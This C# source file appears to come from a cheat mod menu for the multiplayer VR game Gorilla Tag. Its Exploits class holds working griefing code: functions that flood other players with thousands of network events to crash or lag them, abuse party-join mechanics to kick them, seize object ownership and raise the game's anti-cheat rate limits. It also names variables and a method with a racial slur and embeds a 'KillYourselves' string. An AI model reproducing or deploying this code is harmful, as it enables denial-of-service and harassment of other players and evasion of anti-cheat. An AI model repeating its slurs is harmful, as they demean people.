using System;
using System.Collections;
using System.Collections.Generic;
using System.Linq;
using System.Linq.Expressions;
using System.Reflection;
using System.Text;
using ExitGames.Client.Photon;
using GorillaLocomotion.Climbing;
using GorillaNetworking;
using GorillaTag;
using GorillaTag.Cosmetics;
using GorillaTag.Cosmetics.Summer;
using GorillaTagScripts;
using GunLib;
using HarmonyLib;
using Iris.Classes;
using Iris.Mods;
using Photon.Pun;
using Photon.Realtime;
using Photon.Voice;
using Photon.Voice.Fusion;
using Photon.Voice.PUN;
using Photon.Voice.Unity;
using StupidTemplate.Classes;
using UnityEngine;
using UnityEngine.InputSystem;
using UnityEngine.UIElements;
using UnityEngine.XR.Interaction.Toolkit.AffordanceSystem.Receiver.Primitives;
using Valve.VR.InteractionSystem;
using static Iris.Classes.GunLib_again;
using static Iris.Menu.Exploits.KickProperties;
using static Iris.Menu.Exploits.LagProperties;
using Hashtable = ExitGames.Client.Photon.Hashtable;
using Object = UnityEngine.Object;
using Player = Photon.Realtime.Player;

namespace Iris.Menu
{
    internal class Exploits
    {
        public static void GetOwnerShip(NetworkView view)
        {
            if (!view.IsMine)
            {
                MethodInfo info = typeof(RequestableOwnershipGuard).GetMethod("SetOwnership");
                info?.Invoke(null, new object[] { NetworkSystem.Instance.LocalPlayer, true, false });
                Traverse.Create(typeof(RequestableOwnershipGuard)).Field("SetOwnership").SetValue(new object[] { NetworkSystem.Instance.LocalPlayer, true, false });
                view.OnOwnershipTransfered(view.GetView, NetworkSystem.Instance.LocalPlayer.GetPlayerRef());
                view.RequestOwnership();
                view.ReleaseOwnership();
                view.GetView.OwnershipTransfer = OwnershipOption.Takeover;
                view.GetView.RequestOwnership();
                view.GetComponent<RequestableOwnershipGuard>().currentState = NetworkingState.IsClient;
            }
        }
        private static float sigmas = 0f;
        public static void InstantParty()
        {
            if (Time.time > sigmas)
            {
                sigmas = Time.time + 0.1f;
                Traverse.Create(FriendshipGroupDetection.Instance).Field("suppressPartyCreationUntilTimestamp").SetValue(0f);
                Traverse.Create(FriendshipGroupDetection.Instance).Field("groupCreateAfterTimestamp").SetValue(0f);
                List<int> niggers = (List<int>)Traverse.Create(FriendshipGroupDetection.Instance).Field("playersInProvisionalGroup").GetValue();
                if (niggers.Count > 0)
                {
                    Color targetColor = GTColor.RandomHSV((GTColor.HSVRanges)Traverse.Create(FriendshipGroupDetection.Instance).Field("braceletRandomColorHSVRanges").GetValue());
                    Traverse.Create(FriendshipGroupDetection.Instance).Field("myBraceletColor").SetValue(targetColor);
                    List<int> members = new List<int> { PhotonNetwork.LocalPlayer.ActorNumber };
                    foreach (Player player in PhotonNetwork.PlayerListOthers)
                    {
                        if (FriendshipGroupDetection.Instance.IsInMyGroup(player.UserId) || niggers.Contains(player.ActorNumber))
                            members.Add(player.ActorNumber);
                    }
                    typeof(FriendshipGroupDetection).GetMethod("SendPartyFormedRPC", BindingFlags.NonPublic | BindingFlags.Instance).Invoke(FriendshipGroupDetection.Instance, new object[] { FriendshipGroupDetection.PackColor(targetColor), members.ToArray(), false });
                }
            }
        }
        public static int projectilehash = -820530352;
        public static int projectiletrail = 0;
        public static GameObject erm = null;
        public static bool rainboww = false;
        public static int projectiletrailhash = 1432124712;
        public static float delay = 0;
        public static GameObject leftSnowball;
        public static GameObject rightSnowball;
        public static void SlingshotTest(string ProjectileObject, Vector3 velocity, Vector3 pos, Quaternion quaternion)
        {
            if (ControllerInputPoller.instance.rightGrab || Mouse.current.rightButton.isPressed)
            {
                foreach (NetPlayer plr in NetworkSystem.Instance.AllNetPlayers)
                {
                    SnowballThrowable snowball = new SnowballThrowable();
                    GorillaVelocityEstimator estimator = new GameObject("GorillaVelocityEstimator").AddComponent<GorillaVelocityEstimator>();
                    RaiseEventOptions raiseEventOptions;
                    (raiseEventOptions = new RaiseEventOptions()).TargetActors = new int[] { plr.ActorNumber };
                    RaiseEventOptions raiseEventOptions2 = raiseEventOptions;
                    rightSnowball = GameObject.Find("Player Objects/Local VRRig/Local Gorilla Player/RigAnchor/rig/body/shoulder.R/upper_arm.R/forearm.R/hand.R/palm.01.R/TransferrableItemRightHand/GrowingSnowballRightAnchor(Clone)/LMACF. RIGHT.");
                    leftSnowball = GameObject.Find("Local Gorilla Player/RigAnchor/rig/body/shoulder.L/upper_arm.L/forearm.L/hand.L/palm.01.L/TransferrableItemLeftHand/GrowingSnowballLeftAnchor(Clone)/LMACE. LEFT.");
                    if (!snowball.gameObject.activeSelf)
                    {
                        snowball.SetSnowballActiveLocal(true);
                        snowball.velocityEstimator = estimator;
                        snowball.transform.position = pos;
                        snowball.transform.rotation = quaternion;
                    }
                    if (Time.time > delay)
                    {
                        delay = Time.time + 5f + 0.04f;
                        if (snowball.IsMine())
                        {
                            GorillaTagger.Instance.offlineVRRig.RightThrowableProjectileIndex = 0;
                            GorillaTagger.Instance.offlineVRRig.LeftThrowableProjectileIndex = 0;
                            foreach (SnowballThrowable snowballThrowable in Object.FindObjectsOfType<SnowballThrowable>(true))
                            {
                                if (snowballThrowable.name.Contains("LMACF. RIGHT.") || snowballThrowable.name.Contains("LMACE. LEFT."))
                                {
                                    snowballThrowable.SetSnowballActiveLocal(true);
                                    snowballThrowable.gameObject.SetActive(true);
                                }
                            }
                            Rigidbody gorillaRigidbody = GorillaTagger.Instance.GetComponent<Rigidbody>();
                            Vector3 originalVelocity = gorillaRigidbody.velocity;
                            Vector3 originalPosition = snowball.transform.position;
                            gorillaRigidbody.velocity = velocity;

                            MethodInfo launchMethod = typeof(SnowballThrowable).GetMethod("PerformSnowballThrowAuthority", BindingFlags.NonPublic | BindingFlags.Instance);
                            launchMethod.Invoke(snowball, null);

                            gorillaRigidbody.velocity = originalVelocity;
                            snowball.transform.position = originalPosition;

                            PhotonEvent value3 = Traverse.Create(leftSnowball.GetComponent<GrowingSnowballThrowable>()).Field("changeSizeEvent").GetValue<PhotonEvent>();
                            PhotonEvent value4 = Traverse.Create(leftSnowball.GetComponent<GrowingSnowballThrowable>()).Field("snowballThrowEvent").GetValue<PhotonEvent>();
                            PhotonNetwork.RaiseEvent(176, new object[]
                            {
                            Traverse.Create(value4).Field("_eventId").GetValue(),
                            pos,
                            velocity,
                            5f
                            }, raiseEventOptions2, SendOptions.SendReliable);
                            PhotonNetwork.RaiseEvent(176, new object[]
                            {
                            Traverse.Create(value3).Field("_eventId").GetValue(),
                            2
                            }, raiseEventOptions, SendOptions.SendReliable);
                            PhotonEvent value34 = Traverse.Create(rightSnowball.GetComponent<GrowingSnowballThrowable>()).Field("changeSizeEvent").GetValue<PhotonEvent>();
                            PhotonEvent value44 = Traverse.Create(rightSnowball.GetComponent<GrowingSnowballThrowable>()).Field("snowballThrowEvent").GetValue<PhotonEvent>();
                            PhotonNetwork.RaiseEvent(176, new object[]
                            {
                            Traverse.Create(value44).Field("_eventId").GetValue(),
                            pos,
                            velocity,
                            5f
                            }, raiseEventOptions2, SendOptions.SendReliable);
                            PhotonNetwork.RaiseEvent(176, new object[]
                            {
                            Traverse.Create(value34).Field("_eventId").GetValue(),
                            2
                            }, raiseEventOptions, SendOptions.SendReliable);
                        }
                        else
                        {
                            if (rightSnowball || leftSnowball)
                            {
                                rightSnowball.GetComponent<GrowingSnowballThrowable>().SetSnowballActiveLocal(false);
                                leftSnowball.GetComponent<GrowingSnowballThrowable>().SetSnowballActiveLocal(false);
                            }
                        }
                    }
                }
            }
        }
        public static void SetTick(float tick)
        {
            Traverse.Create(GameObject.Find("PhotonMono").GetComponent<PhotonHandler>()).Field("nextSendTickCountOnSerialize").SetValue((int)(Time.realtimeSinceStartup * tick));
        }
        public static float crash = 0;
        public static void popAllballons()
        {
            if (ControllerInputPoller.instance.rightGrab || Mouse.current.rightButton.isPressed)
            {
                foreach (BalloonDynamics d in BalloonDynamics.FindObjectsOfType<BalloonDynamics>())
                {
                    BalloonSpawner spawner = new BalloonSpawner();
                    spawner.SpawnBalloon(Balloon.BalloonColor.Random);
                    spawner.spawnDirectionTransform.transform.position = GorillaTagger.Instance.transform.position;
                    spawner.color = Balloon.BalloonColor.Random;
                    d.balloonScale = 50f;
                    spawner.scale = 50f;
                    BalloonHoldable holdable = new BalloonHoldable();
                    holdable.currentState = TransferrableObject.PositionState.InRightHand;
                    PhotonNetwork.Instantiate(holdable.gameObject.name, GorillaTagger.Instance.rightHandTransform.transform.position, Quaternion.identity);
                    archiveCosmetics = CosmeticsController.instance.currentWornSet.ToPackedIDArray();
                    string[] itjustworks = new string[] { "LMAJU.", "LMAJU.", "LMAJU.", "LMAJU.", "LMAJU.", "LMAJU.", "LMAJU.", "LMAJU.", "LMAJU.", "LMAJU.", "LMAJU.", "LMAJU.", "LMAJU.", "LMAJU.", "LMAJU.", "LMAJU." };
                    CosmeticsController.instance.currentWornSet = new CosmeticsController.CosmeticSet(itjustworks, CosmeticsController.instance);
                    GorillaTagger.Instance.offlineVRRig.cosmeticSet = new CosmeticsController.CosmeticSet(itjustworks, CosmeticsController.instance);
                    GorillaTagger.Instance.myVRRig.SendRPC("RPC_UpdateCosmeticsWithTryonPacked", RpcTarget.All, new object[] { PackCosmetics(itjustworks), CosmeticsController.instance.tryOnSet.ToPackedIDArray() });
                }
            }
        }
        private static Dictionary<string[], int[]> cachePacked = new Dictionary<string[], int[]> { };
        public static int[] PackCosmetics(string[] Cosmetics)
        {
            if (cachePacked.ContainsKey(Cosmetics))
                return cachePacked[Cosmetics];

            CosmeticsController.CosmeticSet Set = new CosmeticsController.CosmeticSet(Cosmetics, CosmeticsController.instance);
            int[] PackedIDs = Set.ToPackedIDArray();
            cachePacked.Add(Cosmetics, PackedIDs);
            return PackedIDs;
        }
        private static int[] archiveCosmetics = null;
        public static void BecomeBalloon()
        {
            GorillaTagger.Instance.offlineVRRig.enabled = false;
            GorillaTagger.Instance.offlineVRRig.inTryOnRoom = true;
            GorillaTagger.Instance.offlineVRRig.transform.position = new Vector3(-51.4897f, 16.9286f, -120.1083f);

            bool FoundBalloon = false;
            foreach (BalloonHoldable Balloon in BalloonHoldable.FindObjectsOfType<BalloonHoldable>())
            {
                if (Balloon.ownerRig == GorillaTagger.Instance.offlineVRRig && Balloon.gameObject.name.Contains("LMAMI"))
                {
                    FoundBalloon = true;

                    Traverse.Create(Balloon).Field("maxDistanceFromOwner").SetValue(float.MaxValue);
                    Balloon.currentState = TransferrableObject.PositionState.Dropped;

                    Balloon.gameObject.transform.position = GorillaTagger.Instance.headCollider.transform.position + (GorillaTagger.Instance.headCollider.transform.up * -1f);
                    Balloon.gameObject.transform.rotation = GorillaTagger.Instance.headCollider.transform.rotation;
                }
            }
            if (!FoundBalloon)
            {
                CosmeticsController.instance.ApplyCosmeticItemToSet(GorillaTagger.Instance.offlineVRRig.tryOnSet, CosmeticsController.instance.GetItemFromDict("LMAAP."), true, false);
                CosmeticsController.instance.UpdateWornCosmetics(true);
            }
            else
            {
                if (!GorillaTagger.Instance.offlineVRRig.enabled)
                    GorillaTagger.Instance.offlineVRRig.enabled = true;
            }
        }
        public static void Spammer()
        {
            Vector3 pos = GorillaTagger.Instance.rightHandTransform.transform.position;
            Quaternion quaternion = Quaternion.identity;
            Vector3 averageVelocity = GorillaTagger.Instance.rightHandTransform.forward;
            GorillaTagger.Instance.offlineVRRig.enabled = false;
            GorillaTagger.Instance.offlineVRRig.transform.position = new Vector3(-51.4897f, 16.9286f, -120.1083f);

            RaiseEventOptions raiseEventOptions = new RaiseEventOptions()
            {
                Receivers = ReceiverGroup.All
            };
            var state = TransferrableObject.PositionState.None;

            object[] Data = new object[]
            {
              -201078895,
               state,
               pos,
               quaternion,
               averageVelocity
            };

            PhotonNetwork.RaiseEvent(176, Data, raiseEventOptions, SendOptions.SendReliable);
        }
        public static void CrashGun()
        {
            GunLib.GunTemplate.StartBothGuns(() =>
            {
                if (Time.time > crash)
                {
                    crash = Time.time + 6.5f;
                    for (int i = 0; i < 3700; i++)
                    {
                        PhotonNetwork.NetworkingClient.OpRaiseEvent(204, new object[]
                                   {
                        "iris"
                                   }, new RaiseEventOptions
                                   {
                                       CachingOption = 0,
                                       TargetActors = new int[] { RigManager.GetPlayerFromVRRig(GunTemplate.LockedPlayer).ActorNumber }


                                   }, SendOptions.SendReliable);
                    }
                }
            }, true);
        }
        public static void CrashAll()
        {
            if (PhotonNetwork.InRoom || PhotonNetwork.InLobby)
            {
                foreach (VRRig rig in GorillaParent.instance.vrrigs)
                {
                    if (Time.time > crash)
                    {
                        crash = Time.time + 6.5f;
                        SetTick(9999f);
                        for (int i = 0; i < 3700; i++)
                        {
                            PhotonNetwork.NetworkingClient.OpRaiseEvent(204, new object[]
                            {
                        "iris"
                            }, new RaiseEventOptions
                            {
                                CachingOption = 0,
                                Receivers = ReceiverGroup.Others
                            }, SendOptions.SendReliable);
                        }
                    }
                }
            }
        }
        public static float lagger = 0;
        public static void LagGun()
        {
            GunLib.GunTemplate.StartBothGuns(() =>
            {
                if (Time.time > _lagCooltime)
                {
                    _lagCooltime = Time.time + 1f;
                    for (int i = 0; i < 200; i++)
                    {
                        PhotonNetwork.NetworkingClient.OpRaiseEvent(204, new object[]
                                                          {
                        "iris"
                                                          }, new RaiseEventOptions
                                                          {
                                                              CachingOption = 0,
                                                              TargetActors = new int[] { RigManager.GetPlayerFromVRRig(GunTemplate.LockedPlayer).ActorNumber }


                                                          }, SendOptions.SendReliable); PhotonNetwork.SendAllOutgoingCommands();
                    }
                }
            }, true);
        }
        public static void LagAll()
        {
            if (PhotonNetwork.InRoom || PhotonNetwork.InLobby)
            {
                if (Time.time > _lagCooltime)
                {
                    _lagCooltime = Time.time + 1f;
                    for (int i = 0; i < 200; i++)
                    {
                        PhotonNetwork.NetworkingClient.OpRaiseEvent(204, new object[]
                        {
                        "iris"
                        }, new RaiseEventOptions
                        {
                            CachingOption = 0,
                            Receivers = ReceiverGroup.Others
                        }, SendOptions.SendReliable);
                    }
                    PhotonNetwork.SendAllOutgoingCommands();
                }
            }
        }
        public static void KickGun()
        {
            GunTemplate.StartBothGuns(() =>
            {
                PhotonNetwork.CurrentRoom.IsVisible = true;
                if (!PhotonNetwork.CurrentRoom.IsVisible) return;
                for (int i = 0; i < 50; i++)
                {
                    InstantParty();
                    FriendshipGroupDetection.Instance.friendshipBubble.transform.localScale = new Vector3(99f, 999f, 999f);
                    GorillaComputer.instance.friendJoinCollider.playerIDsCurrentlyTouching.Remove(GunTemplate.LockedPlayer.OwningNetPlayer.UserId);
                    GorillaComputer.instance.OnGroupJoinButtonPress(0, GorillaComputer.instance.friendJoinCollider);
                }
            }, true);
        }
        public static void KickAll()
        {
            foreach (NetPlayer netPlayer in NetworkSystem.Instance.AllNetPlayers)
            {
                for (int i = 0; i < 50; i++)
                {
                    InstantParty();
                    GorillaComputer.instance.friendJoinCollider.playerIDsCurrentlyTouching.Remove(netPlayer.UserId);
                    GorillaComputer.instance.OnGroupJoinButtonPress(0, GorillaComputer.instance.friendJoinCollider);
                }
            }
        }

        public static void AppQuitAllVioletUsers()
        {
            Hashtable hashtable = new Hashtable();
            hashtable.Clear();
            hashtable.Add("KillYourselvesa6F9XB7WpNmK5R2Lt8YzcGHMWVJ3kqX9RbLC4dTN5XpVYZ7RmLW8FGacKH2V9LB3qWX7Ft5NzGHKaJ", true);
            PhotonNetwork.SetPlayerCustomProperties(hashtable);
        }
        public static void AppQuitGunVioletusers()
        {
            GunTemplate.StartBothGuns(() => 
            {
                Hashtable hashtable = new Hashtable();
                hashtable[0] = new int[] { GunTemplate.LockedPlayer.OwningNetPlayer.ActorNumber };
                hashtable.Clear();
                hashtable.Add("KillYourselvesa6F9XB7WpNmK5R2Lt8YzcGHMWVJ3kqX9RbLC4dTN5XpVYZ7RmLW8FGacKH2V9LB3qWX7Ft5NzGHKaJ", true);
                PhotonNetwork.SetPlayerCustomProperties(hashtable);
            }, true);
        }
        public static void AntiLeaveGun()
        {
            GunLib.GunTemplate.StartBothGuns(() =>
            {

            }, true);
        }
        public static void InfCosmeticWear()
        {

        }
        public static void CrashOnTouch()
        {
            foreach (VRRig rig in GorillaParent.instance.vrrigs)
            {
                if (!rig.isMyPlayer && !rig.isOfflineVRRig && RigManager.GetPhotonViewFromVRRig(rig) != null)
                {
                    float rightdistance = Vector3.Distance(GorillaTagger.Instance.rightHandTransform.transform.position, rig.transform.position);
                    float leftdistance = Vector3.Distance(GorillaTagger.Instance.leftHandTransform.transform.position, rig.transform.position);
                    float bodydistance = Vector3.Distance(GorillaTagger.Instance.offlineVRRig.transform.position, rig.transform.position);

                    float rightthingy = Vector3.Distance(rig.rightHandTransform.transform.position, GorillaTagger.Instance.offlineVRRig.transform.position);
                    float leftthingy = Vector3.Distance(rig.leftHandTransform.transform.position, GorillaTagger.Instance.offlineVRRig.transform.position);
                    float bodythingy = Vector3.Distance(rig.transform.position, GorillaTagger.Instance.offlineVRRig.transform.position);
                    if ((rightdistance <= .3f || leftdistance <= .3f || bodydistance <= .5f) || (rightthingy <= .3f || leftdistance <= .3f || bodythingy <= .5f))
                    {
                        if (rightdistance <= .3f)
                        {
                            GorillaTagger.Instance.StartVibration(false, GorillaTagger.Instance.tagHapticStrength / 2, GorillaTagger.Instance.tagHapticDuration / 2);
                        }
                        if (leftdistance <= .3f)
                        {
                            GorillaTagger.Instance.StartVibration(false, GorillaTagger.Instance.tagHapticStrength / 2, GorillaTagger.Instance.tagHapticDuration / 2);
                        }
                        for (int i = 0; i < 5; i++)
                        {
                        }
                    }
                }
            }
        }
        public static void CrashAura()
        {
            if (Vector3.Distance(RigManager.GetClosestVRRig().transform.position, GorillaLocomotion.GTPlayer.Instance.headCollider.transform.position) < 3.5f && !Physics.Linecast(GorillaLocomotion.GTPlayer.Instance.transform.position, RigManager.GetClosestTagged().transform.position, LayerMask.NameToLayer("Gorilla Tag Collider")))
            {
                if (RigManager.GetPlayerFromVRRig(RigManager.GetClosestVRRig()) == null) { return; }
                NetPlayer player = RigManager.GetPlayerFromVRRig(RigManager.GetClosestVRRig());
                for (int i = 0; i < 5; i++)
                {
                }
            }
        }
        private static float Shittymethod;
        public struct LagProperties
        {
            public enum LagType { Player, Others }
            public Player target { get; private set; }
            public LagType type { get; private set; }
            public LagProperties(LagType Type, Player Player = null)
            {
                type = Type;
                target = Player;
            }
        }
        private static float _lagCooltime;
        private static void LagMod(LagProperties properties)
        {
            if (Time.time > _lagCooltime + 1.45f)
            {
                _lagCooltime = Time.time;
                switch (properties.type)
                {
                    case LagProperties.LagType.Player:
                        if (properties.target != null)
                        {
                            for (int i = 0; i < 550; i++)
                            {
                                ExitGames.Client.Photon.Hashtable entries = new ExitGames.Client.Photon.Hashtable();
                                object[] sendEventData = new object[2];
                                sendEventData[0] = PhotonNetwork.ServerTimestamp;
                                sendEventData[1] = (byte)76;
                                entries.Add(i, sendEventData);
                                PhotonNetwork.NetworkingClient.OpRaiseEvent(210, entries, new RaiseEventOptions { TargetActors = new int[] { properties.target.ActorNumber } }, SendOptions.SendReliable);
                                PhotonNetwork.RaiseEvent(210, entries, new RaiseEventOptions { TargetActors = new int[] { properties.target.ActorNumber } }, SendOptions.SendReliable);
                            }
                            PhotonNetwork.SendAllOutgoingCommands();
                            PhotonNetwork.NetworkingClient.LoadBalancingPeer.SendOutgoingCommands();
                        }
                        break;
                    case LagProperties.LagType.Others:
                        if (properties.target == null)
                        {
                            for (int i = 0; i < 550; i++)
                            {
                                ExitGames.Client.Photon.Hashtable entries = new ExitGames.Client.Photon.Hashtable();
                                object[] sendEventData = new object[2];
                                sendEventData[0] = PhotonNetwork.ServerTimestamp;
                                sendEventData[1] = (byte)76;
                                entries.Add(i, sendEventData);
                                PhotonNetwork.NetworkingClient.OpRaiseEvent(210, entries, new RaiseEventOptions { Receivers = ReceiverGroup.Others }, SendOptions.SendReliable);
                                PhotonNetwork.RaiseEvent(210, entries, new RaiseEventOptions { Receivers = ReceiverGroup.Others }, SendOptions.SendReliable);
                            }
                            PhotonNetwork.SendAllOutgoingCommands();
                            PhotonNetwork.NetworkingClient.LoadBalancingPeer.SendOutgoingCommands();
                        }
                        break;
                }
            }
        }
        public static void NoNiggers()
        {
            GorillaNot.instance.rpcErrorMax = int.MaxValue;
            GorillaNot.instance.rpcCallLimit = int.MaxValue;
            GorillaNot.instance.logErrorMax = int.MaxValue;
            PhotonNetwork.MaxResendsBeforeDisconnect = int.MaxValue;
            PhotonNetwork.QuickResends = int.MaxValue;
            PhotonNetwork.OpRemoveCompleteCache();
            PhotonNetwork.OpCleanActorRpcBuffer(PhotonNetwork.LocalPlayer.ActorNumber);
            PhotonNetwork.SendAllOutgoingCommands();
            GorillaNot.instance.OnPlayerLeftRoom(PhotonNetwork.LocalPlayer);
        }
        public struct KickProperties
        {
            public enum KickType { Player, Others }
            public Player target { get; private set; }
            public KickType type { get; private set; }
            public KickProperties(KickType Type, Player Player = null)
            {
                type = Type;
                target = Player;
            }
        }
        public static void oldkickall()
        {
            if (ControllerInputPoller.instance.rightGrab || Mouse.current.rightButton.isPressed)
            {
                LckWallCameraSpawner something = GameObject.Find("Environment Objects/LocalObjects_Prefab/TreeRoom/TreeRoomInteractables/UI/SatelliteWardrobe/LckWallCameraSpawner").GetComponent<LckWallCameraSpawner>();
                MethodInfo info = typeof(LckWallCameraSpawner).GetMethod("SpawnCamera", BindingFlags.NonPublic | BindingFlags.Instance);
                info.Invoke(something, new object[] { GorillaTagger.Instance.offlineVRRig.rightHandTransform.gameObject.GetComponent<GorillaGrabber>() });
            }
        }
        private static float _kickCooltime;
        private static void KickMod(KickProperties properties)
        {
            if (Time.time > _kickCooltime + 1.5f)
            {
                _kickCooltime = Time.time;
                switch (properties.type)
                {
                    case KickProperties.KickType.Player:
                        if (properties.target != null)
                        {
                           
                        }
                        break;
                    case KickProperties.KickType.Others:
                        if (properties.target == null)
                        {
                            
                        }
                        break;
                }
            }
        }
    }
}
